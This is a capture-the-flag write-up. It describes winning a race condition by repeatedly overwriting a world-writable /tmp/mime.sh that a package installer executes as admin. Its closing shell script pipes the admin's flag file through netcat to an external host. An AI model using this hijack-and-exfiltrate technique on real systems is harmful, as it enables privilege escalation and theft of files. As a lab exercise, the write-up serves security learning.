when running docker container with the run-debug.sh you are able to explore
the filesystem.

when the container starts, a script for a user 'guest' runs, this is your
exploit.sh (see my input below) then an admin script starts.

the admin basically installs /home/admin/data/softmaker-
freeoffice-2018_980-01_amd64.deb and then opens up a presentation file that
includes the flag.  
so goal is to get the real flag file.

so while exploring the filesystem you might look for files writeable by
others, i noticed a log file **/tmp/smfree.1.log**

when looking through the log file you notice the line:

** su admin -c "sh /tmp/mime.sh" **

nice, script gets executed as admin!

so the idea was to write this file before the install process kicks in and
include some commands to copy the flag.prdx file from admin home (location is
known from the docker image)

this took me forever ... well at least too long to submit the flag ... BUT ..
i came close (again) the problem is that when you write stuff into
/tmp/mime.sh it might get overwritten by the package install scripts. my
version worked pretty well in the local sandbox without any need to worry
about such race condition that was a bit confusing.

then i tried couple of things to wait for the process or  wait for the mime.sh
file show up  but all failed ... so only after ctf finished i tried this
version writing a different tmp file and continuesly copy over the
/tmp/mime.sh in the hopes it gets executed ... and ... it finally worked

```  
touch /tmp/mime.sh  
chmod 777  
  
/bin/cat <<EOF >/tmp/mymime.sh  
cat /home/admin/data/flag.prdx | nc myserver.de 12345  
  
EOF  
  
while true;  
do  
    cp /tmp/mymime.sh /tmp/mime.sh  
done  
```

Flag: DrgnS{W4at_ab0ut_r3spon5ible_di5closur3}